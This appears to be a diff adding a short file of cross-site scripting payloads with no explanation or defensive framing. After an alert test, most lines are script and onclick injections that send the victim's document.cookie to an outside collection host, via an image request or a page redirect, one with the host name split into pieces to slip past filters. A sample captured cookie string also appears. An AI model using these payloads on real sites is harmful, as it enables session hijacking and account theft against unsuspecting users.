@@ -1,0 +1,15 @@
+<a onclick=alert(12345)>t</a>
+
+<script>var i=new Image();i.src="http://rea6.hol.es/c.php?"+document.cookie;</script>
+
+<script>
+var i=new Image();
+i.src="http://rea6"+".hol"+".es/c.php?c"+"="+document.cookie;
+</script>
+
+<script>document./location="http://real6.hol.es/c.php?c="+document.cookie;</script>
+
+_ga=GA1.3.66667338.1456937444; member=1
+
+<script>document.location="http://rea6.hol.es//c.php?"+document.cookie;</script>
+<a onclick=document.location="http://rea6.hol.es//c.php?"+document.cookie;>t</a>
